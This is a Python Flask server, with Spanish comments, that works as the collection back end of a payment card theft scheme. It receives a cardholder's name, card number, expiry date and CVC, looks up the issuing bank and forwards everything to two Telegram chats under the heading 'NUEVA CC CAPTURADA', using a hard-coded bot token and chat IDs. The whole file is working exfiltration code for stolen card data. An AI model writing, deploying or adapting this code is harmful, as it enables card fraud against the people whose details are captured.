import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'
LISTA_DE_RECEPTORES = ['6953415010', '7707049896']

def get_bank_info_direct(card_number):
    """Consulta única y directa sin reintentos infinitos."""
    bin_number = card_number[:6]
    url = f"https://lookup.binlist.net/{bin_number}"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    try:
        # Hacemos una única petición con un tiempo de espera corto
        response = requests.get(url, headers=headers, timeout=3)
        
        if response.status_code == 200:
            data = response.json()
            bank = data.get('bank', {}).get('name', 'Desconocido')
            type_card = data.get('type', 'DESCONOCIDO').upper()
            country = data.get('country', {}).get('name', 'Desconocido')
            return f"{bank} | {type_card} | {country}"
        elif response.status_code == 429:
            return "⚠️ API Saturada (Límite alcanzado)"
        else:
            return "🏦 Banco: Desconocido"
    except Exception as e:
        print(f"Error en consulta: {e}")
        return "🏦 Error de conexión"

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    target_id = str(data.get('target_id'))

    # 1. Validación de seguridad rápida
    if target_id not in LISTA_DE_RECEPTORES:
        return jsonify({"status": "ignored"}), 200

    # 2. Captura de datos
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # 3. Consulta del banco (UNA SOLA VEZ)
    print(f"🔍 Procesando tarjeta: {tarjeta[:6]}...")
    info_banco = get_bank_info_direct(tarjeta)

    # 4. Construcción del mensaje
    mensaje = (
        "💰 *NUEVA CC CAPTURADA* 💰\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🏦 *INFO:* `{info_banco}`\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    # 5. Envío a los receptores
    exitos = 0
    for receptor in LISTA_DE_RECEPTORES:
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": receptor, "text": mensaje, "parse_mode": "Markdown"}
        try:
            res = requests.post(url_telegram, json=payload, timeout=5)
            if res.status_code == 200:
                exitos += 1
        except:
            continue

    print(f"🏁 Finalizado. Enviados a {exitos} personas.")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
